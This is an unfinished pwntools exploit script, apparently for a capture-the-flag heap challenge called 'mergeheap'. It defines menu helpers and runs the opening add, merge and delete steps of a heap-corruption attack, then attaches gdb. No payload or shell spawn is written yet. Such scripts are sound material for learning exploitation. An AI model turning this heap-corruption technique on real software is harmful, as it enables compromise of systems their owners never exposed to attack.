#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './mergeheap'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000


def menu(idx):
    io.recvuntil('>>')
    io.sendline(str(idx))

def add(l, c):
    menu(1)
    io.recvuntil(":")
    io.sendline(str(l))
    io.recvuntil(":")
    io.sendline(c)

def show(i):
    menu(2)
    io.recvuntil(":")
    io.sendline(str(i))

def delete(i):
    menu(3)
    io.recvuntil(":")
    io.sendline(str(i))

def merge(i1, i2):
    menu(4)
    io.recvuntil(":")
    io.sendline(str(i1))
    io.recvuntil(":")
    io.sendline(str(i2))

# make huge chunk
add(0x400, 'a') # 0
add(0x400, 'b') # 1
merge(0, 1) # 2
delete(1)
merge(0, 2) # 1
delete(2)
gdb.attach(io, '')





io.interactive()
